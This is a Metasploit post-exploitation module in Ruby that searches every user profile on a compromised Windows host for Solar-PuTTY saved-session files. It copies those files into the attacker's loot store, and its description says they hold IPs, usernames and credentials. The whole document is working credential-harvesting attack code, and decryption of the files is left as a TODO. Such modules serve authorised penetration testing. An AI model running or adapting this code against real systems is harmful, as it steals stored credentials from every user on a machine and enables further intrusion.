##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
	include Msf::Auxiliary::Report
	include Msf::Post::Windows::UserProfiles
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info,
			'Name'		=> 'Windows Gather Solar PuTTY Saved Sessions',
			'Description'	=> %q{This module searches for saved Solar PuTTY sessions in the user's appdata folder; it extracts saved sessions details (IP, username, credential).},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['Paolo Stagno aka VoidSec <voidsec[at]voidsec.com>'],
			'References'	=>
				[
					['URL', 'https://voidsec.com/solarputtydecrypt/'],
				],
			'Platform'	=> [ 'win' ],
			'SessionTypes'	=> [ 'meterpreter' ]
		))
	end

	def run
		print_status("Looking for Solar PuTTY's sessions storage...")
		# retrieve %appdata% folder and current username 
		env=session.sys.config.getenvs('APPDATA', 'USERNAME')
		if env['APPDATA'].nil?
			fail_with(Failure::NotFound, "Target does not have %APPDATA% environment variable set")
		elsif env['USERNAME'].nil?
      			fail_with(Failure::NotFound, "Target does not have 'USERNAME' environment variable set")
		end
		# if there are more users in the system retreive stored session from them too
		user_dir = "#{env['APPDATA']}\\..\\.."
    		user_dir << "\\.." if user_dir.include?('Users')
		users = dir(user_dir)
		users.each do |user|
	      		next if user == "." || user == ".." || user == "desktop.ini"
	      			user_session = "#{env['APPDATA'].gsub(env['USERNAME'], user)}\\SolarWinds\\FreeTools\\Solar-PuTTY\\data.dat"
	      			print_status("Looking for #{user_session}")
				if file?(user_session)
					get_session(user_session)		
				elsif
					print_error("Session not found")
				end
		end
	end
	
	def get_session(file_path)
		print_good("Solar PuTTY session located at #{file_path}")
		file = read_file(file_path)
		# TODO: decrypt the session file
		stored_path = store_loot('solar_putty.dat', 'text/plain', session, file, 'solar_putty.dat', file_path)
		print_good("Solar PuTTY session saved to loot: #{stored_path}")
	end
end